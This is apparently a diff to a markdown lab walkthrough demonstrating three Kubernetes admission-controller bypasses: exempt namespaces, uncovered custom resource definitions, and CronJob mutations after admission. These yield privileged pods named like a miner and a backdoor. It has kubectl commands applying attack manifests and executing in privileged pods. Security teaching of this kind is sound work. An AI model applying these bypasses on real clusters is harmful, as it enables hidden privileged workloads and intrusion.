@@ -17,23 +17,23 @@
 ### Bypass 1: Exempt namespaces
 
 ```bash
-cat /app/attacks/exempt-namespace-pod.yaml
-kubectl apply -f /app/attacks/exempt-namespace-pod.yaml
+cat /app/exploits/exempt-namespace-pod.yaml
+kubectl apply -f /app/exploits/exempt-namespace-pod.yaml
 ```
 
 The privileged pod deploys in the exempt namespace. Admission controllers skip certain namespaces to avoid breaking system components.
 
 ```bash
-kubectl get pod -n kube-system malicious-debug-pod
-kubectl exec -n kube-system malicious-debug-pod -- whoami
-kubectl exec -n kube-system malicious-debug-pod -- cat /proc/1/status | head -5
+kubectl get pod -n monitoring privileged-miner
+kubectl exec -n monitoring privileged-miner -- whoami
+kubectl exec -n monitoring privileged-miner -- cat /proc/1/status | head -5
 ```
 
 ### Bypass 2: Uncovered Custom Resource Definitions
 
 ```bash
-cat /app/attacks/uncovered-crd.yaml
-kubectl apply -f /app/attacks/uncovered-crd.yaml
+cat /app/exploits/uncovered-crd.yaml
+kubectl apply -f /app/exploits/uncovered-crd.yaml
 ```
 
 A custom resource type creates a workload functionally equivalent to a privileged pod, but no admission policy covers it. The webhook configuration only matches specific resource types.
@@ -45,8 +45,8 @@ kubectl get validatingwebhookconfigurations -o yaml | grep -A 3 "resources:"
 ### Bypass 3: Post-admission mutations
 
 ```bash
-cat /app/attacks/post-admission-mutation.yaml
-kubectl apply -f /app/attacks/post-admission-mutation.yaml
+cat /app/exploits/post-admission-mutation.yaml
+kubectl apply -f /app/exploits/post-admission-mutation.yaml
 ```
 
 A CronJob patches existing deployments to add privileged security contexts. The initial deployment passes admission. The CronJob mutates it afterward. Admission controllers do not re-validate running workloads.
@@ -58,7 +58,7 @@ kubectl get pods -w --output-watch-events
 ### Combined impact
 
 ```bash
-kubectl get pods --all-namespaces -o wide | grep -E "malicious|backdoor|debug"
+kubectl get pods --all-namespaces -o wide | grep -E "privileged-miner|backdoor-db|metrics-updater"
 ```
 
 Three privileged workloads running, all invisible to the admission controller dashboard showing "100% compliance."
